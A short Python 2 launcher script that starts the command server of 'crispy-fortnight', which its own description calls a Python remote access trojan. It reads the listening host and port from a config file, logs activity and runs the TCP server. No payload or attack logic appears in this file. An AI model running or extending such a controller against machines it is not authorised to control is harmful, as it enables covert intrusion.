import argparse
import logging
import ConfigParser

from crispy.network.server_handler import CrispyTCPServerHandler
from crispy.lib.server import CrispyTCPServer
    
def main():
    argp = argparse.ArgumentParser(description="Run crispy-fortnight (Python RAT) server.",
                                     epilog="Do NOT use this for nefarious purposes!", 
                                     prog="crispy")
    argp.add_argument("--config",
                        dest="config_file",
                        help="Path to crispy config file",
                        metavar="CONFIG_FILE",
                        required=True,
                        type=str)
    argp.add_argument('--version', 
                        action='version', 
                        version='1.0')
    args = argp.parse_args()
    
    config = ConfigParser.ConfigParser()
    config.read(args.config_file)
    
    host = config.get('NETWORK', 'host')
    port = config.getint('NETWORK', 'port')

    logging.basicConfig(filename='crispy.log', level=logging.DEBUG)
    
    try:
        server = CrispyTCPServer((host, port), CrispyTCPServerHandler)
        logging.debug("Started server on {0}:{1}".format(server.server_address[0], server.server_address[1]))
        server.serve_forever()
    except KeyboardInterrupt:
        logging.debug("Shutting down server")
        logging.shutdown()
        server.shutdown()
        server.socket.close()
 
if __name__ == "__main__":
    main()
